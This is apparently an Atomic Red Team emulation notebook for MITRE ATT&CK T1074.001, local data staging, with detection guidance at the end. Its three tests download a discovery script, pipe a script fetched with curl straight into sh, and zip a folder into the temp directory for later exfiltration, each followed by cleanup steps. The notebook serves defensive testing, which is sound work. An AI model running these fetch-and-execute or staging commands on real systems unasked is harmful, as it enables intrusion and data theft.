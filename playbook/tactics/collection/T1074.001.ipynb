{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "08779ad7",
   "metadata": {},
   "source": "# T1074.001 - Local Data Staging\nAdversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)"
  },
  {
   "cell_type": "markdown",
   "id": "be226bc8",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b3420016",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Stage data from Discovery.bat",
    "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd4f30b5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "58da3478",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Force $env:TEMP\\discovery.bat -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20937b11",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a8c87acf",
   "metadata": {},
   "source": "### Atomic Test #2 - Stage data from Discovery.sh\nUtilize curl to download discovery.sh and execute a basic information gathering shell script\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: Check if curl is installed on the machine.\n\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\nwhich apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d851da76",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f665090e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncurl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "14a00fe5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "bffca4ef",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/T1074.001_discovery.log\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "20ec5610",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f7f225a7",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Zip a Folder with PowerShell for Staging in Temp",
    "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCompress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4ada056",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "2bcd9c41",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aba7de4e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1074.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "16a4e68d",
   "metadata": {},
   "source": "## Detection\nProcesses that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nConsider monitoring accesses and modifications to local storage repositories (such as the Windows Registry), especially from suspicious processes that could be related to malicious data collection."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}